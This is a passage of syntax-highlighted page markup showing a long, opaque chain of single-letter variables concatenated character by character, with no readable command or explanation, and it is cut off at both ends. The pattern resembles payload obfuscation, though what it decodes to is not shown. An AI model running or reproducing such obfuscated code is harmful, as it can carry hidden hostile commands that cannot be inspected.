class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span 